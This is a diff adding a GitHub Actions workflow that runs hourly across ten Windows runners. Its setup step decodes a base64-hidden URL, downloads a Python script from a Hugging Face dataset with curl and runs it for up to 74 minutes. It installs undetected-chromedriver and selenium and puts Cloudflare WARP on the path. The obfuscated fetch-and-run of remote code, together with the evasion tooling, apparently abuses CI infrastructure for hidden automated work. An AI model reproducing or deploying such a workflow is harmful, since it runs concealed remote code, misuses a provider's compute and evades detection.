@@ -1,0 +1,70 @@
+name: Distributed Processing Workflow
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: job-mesh-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  run-pipeline-nodes:
+    name: "WorkerNode-${{ matrix.node_index }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Prepare Workspace & Fetch Executable
+        shell: bash
+        run: |
+          echo "[BOOT] Starting setup for Node-${{ matrix.node_index }}..."
+          
+          # فك التشفير للرابط المحدد
+          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2JhYmEvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19ORVcucHk=" | base64 --decode)
+          
+          curl -sL "$REMOTE_SRC" -o runner.py
+          
+          echo "[BOOT] Upgrading Python toolchain & packages..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[BOOT] System dependencies deployed successfully."
+
+      - name: Execute Main Script & Monitor Execution
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output "==> Launching script execution on instance ${{ matrix.node_index }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ExecConfig = @{
+              FilePath     = "python"
+              ArgumentList = "runner.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $WorkerProc = Start-Process @ExecConfig
+          
+          Write-Output "==> Process timeout watcher enabled (Limit: 74 mins)."
+          
+          try {
+              Wait-Process -InputObject $WorkerProc -Timeout 4440 -ErrorAction Stop
+              Write-Output "==> Execution cycle completed without errors."
+          }
+          catch {
+              Write-Output "==> Time limit exceeded. Forcing worker process exit..."
+              Stop-Process -InputObject $WorkerProc -Force
+              Write-Output "==> Worker process terminated by monitor."
+          }
+
+      - name: System Teardown
+        shell: bash
+        run: echo "[COMPLETE] Node-${{ matrix.node_index }} task cycle closed."
